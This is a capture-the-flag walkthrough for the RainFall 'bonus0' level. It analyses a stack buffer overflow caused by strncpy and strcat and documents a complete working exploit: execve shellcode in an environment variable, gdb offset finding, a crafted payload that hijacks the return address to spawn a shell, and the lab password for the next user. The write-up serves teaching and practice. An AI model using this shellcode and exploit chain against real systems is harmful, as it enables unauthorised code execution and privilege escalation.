# bonus0: Exploiting Buffer Overflow

## Challenge Overview

The program `bonus0` is vulnerable to a buffer overflow due to improper handling of user input. The challenge is to exploit this vulnerability to gain access to the `bonus1` user account.

## Source Code Analysis

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

// Function prototypes
void p(char *buffer, char *prompt);
void pp(char *dest);

int main(void)
{
  char buffer[54];  // Main buffer of 54 bytes
  
  pp(buffer);
  puts(buffer);
  return 0;
}

void pp(char *dest)
{
  char first_input[20];   // First input buffer (20 bytes)
  char second_input[20];  // Second input buffer (20 bytes)
  // ...other variables...
  
  p(first_input, " - ");   // Get first input
  p(second_input, " - ");  // Get second input
  
  strcpy(dest, first_input);  // Copy first input to dest (no size check)
  
  // ...code to find end of string and add space...
  
  strcat(dest, second_input);  // Append second input (no size check)
  return;
}

void p(char *buffer, char *prompt)
{
  char *newline_ptr;
  char input_buffer[4104];  // Large input buffer for reading
  
  puts(prompt);
  read(0, input_buffer, 4096);  // Read up to 4096 bytes from stdin
  newline_ptr = strchr(input_buffer, '\n');
  *newline_ptr = '\0';
  strncpy(buffer, input_buffer, 20);  // Copy at most 20 bytes to buffer
  return;
}
```

The program follows this execution flow:

1. `main()` allocates a 54-byte buffer and calls `pp()`
2. `pp()` calls `p()` twice to get two 20-byte inputs
3. `pp()` concatenates these inputs into the buffer in `main()`
4. `main()` prints the combined buffer

## Vulnerability Analysis

The vulnerability in this program centers around several key issues:

1. **Unbounded String Operations**:

   ```c
   // In pp():
   strcpy(dest, first_input);  // No bounds checking
   strcat(dest, second_input);  // No bounds checking
   ```

   These functions don't check if the destination buffer is large enough.

2. **strncpy() Behavior**:

   ```c
   // In p():
   strncpy(buffer, input_buffer, 20);  // Doesn't guarantee null termination
   ```

   When the input is larger than 20 bytes, `strncpy()` doesn't add a null terminator. This means that if the input is ≥20 bytes, the buffer will contain 20 bytes without a terminating null character.

3. **Stack Layout Vulnerability**:
   While the buffer in `main()` is 54 bytes, the critical issue is not that the combined inputs exceed this size. The vulnerability lies in how the stack frame is organized. The return address of `main()` is stored at a fixed distance from the buffer, and by overflowing the buffer with precisely crafted input, we can overwrite this return address.

These vulnerabilities allow an attacker to precisely overwrite the return address of `main()` with the address of their shellcode.

## Exploitation Strategy

To exploit this vulnerability, we need to:

1. **Place Shellcode**: Store our shellcode in an environment variable since the 20-byte input limitation for each input is too small for a complete shellcode.

2. **Craft Two-Part Input**:
   - First input: Fill the buffer with characters to max out the 20-byte limit
   - Second input: Position the shellcode address at the correct offset
3. **Overwrite Return Address**: When the program combines these inputs, they'll overflow `main()`'s buffer and overwrite its return address with our shellcode address.

4. **Execute Shellcode**: When `main()` returns, it will jump to our shellcode in the environment variable, giving us a shell.

## Challenges Encountered

### Challenge 1: Two-Part Input Handling

The program expects two separate inputs, but our testing showed issues:

```bash
(python -c 'print "AAAA"'; python -c 'print "BBBB"') | ./bonus0
```

This approach failed because `read()` would consume both inputs at once for the first prompt. To solve this, we needed to overflow the `read()` buffer in a specific way:

```c
  read(0, input_buffer, 4096);  // Read up to 4096 bytes from stdin
```

```bash
python -c "print 'A'*4095 + '\n' + 'second_input'" > /tmp/payload
```

This creates a file where the first input is 4096 bytes (the limit set on the `read()`), forcing the program to make a second `read()` call for the second input.

### Challenge 2: Shellcode Size Limitation

The `p()` function only copies 20 bytes from our input:

```c
strncpy(buffer, input_buffer, 20);
```

Our shellcode is 21+ bytes, making it impossible to fit within this limitation. We solved this by using an environment variable:

```bash
SHELLCODE=$(python -c 'print "\x90"*50 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
# Create a NOP sled followed by the shellcode
# The NOP sled (0x90 bytes) creates a "landing zone" that increases our chances of 
# successfully executing the shellcode even if our address is slightly off
# Check level2's walkthrough for more details on the shellcode
```

### Challenge 3: Environment Variable Address Consistency

Environment variables can have different addresses across runs, making exploitation unreliable. We created a helper program to find the address:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char *addr = getenv("SHELLCODE");
    if (addr) {
        printf("SHELLCODE address: %p\n", addr);
    } else {
        printf("SHELLCODE not found\n");
    }
    return 0;
}
```

The critical insight was using `env -i` to create a clean environment, making the address consistent:

```bash
env -i SHELLCODE=$SHELLCODE /tmp/get_shellcode_addr
SHELLCODE address: 0xbfffffa8
```

### Challenge 4: Finding the Correct Offset and Minimum Input Size

To precisely determine which bytes in our input overwrite the return address, we created a test input with a recognizable pattern:

```bash
bonus0@RainFall:~$ python -c "print 'A'*4095 + '\n' + 'BCDEFGHIJKLMNOPQRSTU'" > /tmp/find_offset
bonus0@RainFall:~$ gdb ./bonus0

(gdb) break *main+39 # Set a breakpoint at the end of main, just before the return
Breakpoint 1 at 0x80485cb

(gdb) run < /tmp/find_offset
Starting program: /home/user/bonus0/bonus0 < /tmp/find_offset
 -
 -
AAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRSTU��� BCDEFGHIJKLMNOPQRSTU���

Breakpoint 1, 0x080485cb in main ()
(gdb) x/64wx $esp-100
0xbffff5a8:     0x00000001      0x0804835d      0xb7fd13e4      0x41410000
0xbffff5b8:     0x41414141      0x41414141      0x41414141      0x41414141 # The 41s correspond to 'A'
0xbffff5c8:     0x43424141      0x47464544      0x4b4a4948      0x4f4e4d4c # 42 to 4f correspond to 'BCDEFGHIJKLMNOPQRSTU'
0xbffff5d8:     0x53525150      0x0ff45554      0x4220b7fd      0x46454443
0xbffff5e8:     0x4a494847      0x4e4d4c4b      0x5251504f      0xf4555453
0xbffff5f8:     0x00b7fd0f      0xb7fdc858      0x00000000      0xbffff61c
```

And checking which part of our input overwrites the saved EIP:

```
(gdb) info frame
Stack level 0, frame at 0xbffff5f0:
 eip = 0x80485cb in main; saved eip 0x4e4d4c4b
 Saved registers:
  eip at 0xbffff5ec
```

This reveals that the saved return address (`0xbffff5ec`) contains `0x4e4d4c4b`, which corresponds to the characters 'KLMN' in our second input. Looking at our pattern:

```
Second input: 'BCDEFGHIJKLMNOPQRSTU'
                        ^^^^
                        |
                        +-- These characters (KLMN) overwrite EIP
```

This confirms that characters at positions 10-13 in our second input overwrite the return address. Therefore, we need:

- 9 bytes of padding
- 4 bytes for our shellcode address
- Additional padding bytes to ensure reliable execution

Through further testing, we discovered an additional requirement: the second input needs to be at least 20 bytes in total (including our 9-byte padding, 4-byte address, and at least 7 additional bytes) for the exploit to work reliably.

```bash
# This failed (only 6 padding bytes after address)
python -c "print 'B'*4095 + '\n' + 'A'*9 + '\xa8\xff\xff\xbf' + 'A'*6" > /tmp/myexploit

# This worked (7 padding bytes after address)
python -c "print 'B'*4095 + '\n' + 'A'*9 + '\xa8\xff\xff\xbf' + 'A'*7" > /tmp/myexploit
```

This pattern-based approach gives us a precise understanding of how to position our shellcode address to reliably control program execution.

## Final Exploit

Putting it all together:

```bash
# Set up shellcode in environment variable
SHELLCODE=$(python -c 'print "\x90"*50 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')

# Find shellcode address in clean environment
env -i SHELLCODE=$SHELLCODE /tmp/get_shellcode_addr
# SHELLCODE address: 0xbfffffa8

# Create exploit input with at least 20 bytes for second input (9+4+7=20)
python -c "print 'A'*4095 + '\n' + 'B'*9 + '\xa8\xff\xff\xbf' + 'C'*7" > /tmp/payload

# Execute exploit
(cat /tmp/payload; cat) | env -i SHELLCODE=$SHELLCODE ./bonus0
```

## Getting the Password

After executing the exploit, we gained access to the `bonus1` user and retrieved the password:

```bash
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

## Moving to Next Level

Use the password to log in as `bonus1` and proceed to the next challenge.
